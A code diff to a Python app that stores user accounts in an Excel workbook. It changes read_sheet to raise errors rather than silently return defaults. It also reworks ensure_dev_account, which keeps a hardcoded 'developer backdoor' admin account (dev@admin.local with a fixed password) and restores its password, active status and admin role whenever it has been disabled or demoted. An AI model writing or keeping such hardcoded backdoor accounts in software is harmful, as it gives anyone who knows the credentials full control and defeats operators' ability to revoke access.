@@ -33,15 +33,33 @@ def sheet_exists(sheet_name):
     wb = load_workbook(EXCEL_FILE)
     return sheet_name in wb.sheetnames
 
-def read_sheet(sheet_name, default_df):
+def read_sheet(sheet_name, default_df, allow_empty_on_error=False):
+    """Read a sheet from the Excel file.
+
+    Args:
+        sheet_name: Name of the sheet to read
+        default_df: Default DataFrame to return if sheet doesn't exist
+        allow_empty_on_error: If False (default), raises exception on read errors
+                              to prevent data loss from silent failures
+    """
     ensure_workbook()
     if not sheet_exists(sheet_name):
         write_sheet(sheet_name, default_df)
         return default_df.copy()
     try:
-        return pd.read_excel(EXCEL_FILE, sheet_name=sheet_name, engine="openpyxl")
-    except Exception:
-        return default_df.copy()
+        df = pd.read_excel(EXCEL_FILE, sheet_name=sheet_name, engine="openpyxl")
+        # Safety check: if we expect data but got empty, log a warning
+        if len(df) == 0 and sheet_name == "Users":
+            # For Users sheet, empty is suspicious - could indicate a read problem
+            import logging
+            logging.warning(f"Read empty Users sheet - this may indicate a data issue")
+        return df
+    except Exception as e:
+        if allow_empty_on_error:
+            return default_df.copy()
+        else:
+            # Raise the exception to prevent silent data loss
+            raise RuntimeError(f"Failed to read sheet '{sheet_name}': {e}") from e
 
 def write_sheet(sheet_name, df):
     ensure_workbook()
@@ -89,7 +107,14 @@ def migrate_plaintext_passwords():
 
 def ensure_dev_account():
     """Ensure a developer backdoor account exists for emergency access."""
-    users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
+    try:
+        users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
+    except Exception:
+        # If we can't read the Users sheet, don't risk overwriting data
+        import logging
+        logging.error("Could not read Users sheet for dev account check - skipping to prevent data loss")
+        return
+
     dev_email = "dev@admin.local"
     dev_password = "Dev@2024!"
 
@@ -97,7 +122,7 @@ def ensure_dev_account():
     existing = users_df[users_df["Email"].str.lower() == dev_email.lower()]
 
     if len(existing) == 0:
-        # Add dev account
+        # Add dev account - only write the new row, preserving all existing users
         new_row = pd.DataFrame([{
             "Email": dev_email,
             "Role": "admin",
@@ -108,11 +133,18 @@ def ensure_dev_account():
         users_df = pd.concat([users_df, new_row], ignore_index=True)
         write_sheet("Users", users_df)
     else:
-        # Reset dev account password in case it was changed
-        users_df.loc[users_df["Email"].str.lower() == dev_email.lower(), "Password"] = hash_password(dev_password)
-        users_df.loc[users_df["Email"].str.lower() == dev_email.lower(), "Active"] = True
-        users_df.loc[users_df["Email"].str.lower() == dev_email.lower(), "Role"] = "admin"
-        write_sheet("Users", users_df)
+        # Only update the dev account if its password/status actually needs resetting
+        dev_idx = users_df["Email"].str.lower() == dev_email.lower()
+        current_active = users_df.loc[dev_idx, "Active"].iloc[0]
+        current_role = users_df.loc[dev_idx, "Role"].iloc[0]
+
+        # Only write if something actually changed (prevent unnecessary writes)
+        needs_update = not current_active or current_role != "admin"
+        if needs_update:
+            users_df.loc[dev_idx, "Password"] = hash_password(dev_password)
+            users_df.loc[dev_idx, "Active"] = True
+            users_df.loc[dev_idx, "Role"] = "admin"
+            write_sheet("Users", users_df)
 
 def seed_defaults_if_empty():
     users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
